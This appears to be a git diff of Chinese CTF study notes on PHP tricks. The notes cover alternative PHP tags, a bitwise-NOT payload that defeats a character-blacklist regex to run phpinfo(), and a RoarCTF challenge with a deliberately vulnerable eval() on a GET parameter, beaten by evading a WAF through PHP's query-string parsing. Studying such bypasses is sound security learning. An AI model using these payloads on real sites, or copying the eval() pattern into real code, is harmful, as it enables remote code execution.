@@ -317,19 +317,24 @@ scandir,file_get_contents('/proc/...')
   - 如<?php ?>中的<?和?>被替换，可以用<script>标签绕过
 
   ```php+HTML
-  <script langulage=php>
+  <script langulage="php">
   system("ls");
   </script>
   ```
 
-  -    <? echo 'this is the simplest, an SGML processing instruction'; ?>
-        <?= expression ?> This is a shortcut for "<? echo expression ?>"
+  -    ```php
+       <? echo 'this is the simplest, an SGML processing instruction'; ?>
+      <?= expression ?> This is a shortcut for "<? echo expression ?>"
+      ```
+     
+  -    
+  
 
-  ​        利用条件：php.ini 配置文件中的指令 [short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag) 打开后才可用
+​        利用条件：php.ini 配置文件中的指令 [short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag) 打开后才可用
 
   -  <% echo 'You may optionally use ASP-style tags'; %>
         <%= $variable; # This is a shortcut for "<% echo . . ." %>  
-
+  
       利用条件：php.ini 配置文件中的指令 [asp_tags](https://www.php.net/manual/zh/ini.core.php#ini.asp-tags) 打开后才可用。
 
 ## 杂
@@ -354,6 +359,83 @@ PHP需要将所有参数转换为一个有效的变量名，所以当解析查�
 ### header('Location: ./?failed=1');后面没加exit()
 
 后面的代码还会执行
+
+
+
+## tricks
+
+### 利用`(~xxxxxx)(~xxxxx)`来绕过字符限制
+
+eg .
+
+```php
+
+if(!preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',substr($_GET['i'],$i,1)))
+    eval($_GET['i']);
+```
+
+此时用%28%7E%8F%97%8F%96%91%99%90%29%28%29来绕过执行phpinfo()
+
+```php
+$str='phpinfo';
+$payload="(~".(~$str).")()";
+#$payload="(~".~$str.")(~".(~"HTTP_X").")";
+for($i=0;$i<strlen($payload);$i++)
+    if(preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',substr($payload,$i,1)))
+        print("failed");
+    else print("success\n");
+print(($payload."\n"));
+```
+
+
+
+
+
+### 绕过字符限制
+
+- 关键函数:end(),getallheaders(),pos()
+- `~|^&`等运算符来绕过
+
+
+
+
+
+### 利用php字符串解析特性绕过waf
+
+https://www.freebuf.com/articles/web/213359.html
+
+![](https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small)
+
+![](https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small)
+
+
+
+#### 例题
+
+2019roarctf 
+
+```php
+
+<?php
+error_reporting(0);
+if(!isset($_GET['num'])){
+    show_source(__FILE__);
+}else{
+        $str = $_GET['num'];
+        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
+        foreach ($blacklist as $blackitem) {
+                if (preg_match('/' . $blackitem . '/m', $str)) {
+                        die("what are you want to do?");
+                }
+        }
+        eval('echo '.$str.';');
+}
+?>
+```
+
+
+
+题目在apache那里配了一个waf,过滤字符和不可打印字符,加上php的其他限制,导致利用运算符生成字符困难,但是apache的waf只能匹配到num,却无法匹配%20num,%20num在php中会被解析成num,最后成功绕过waf
 
 
 
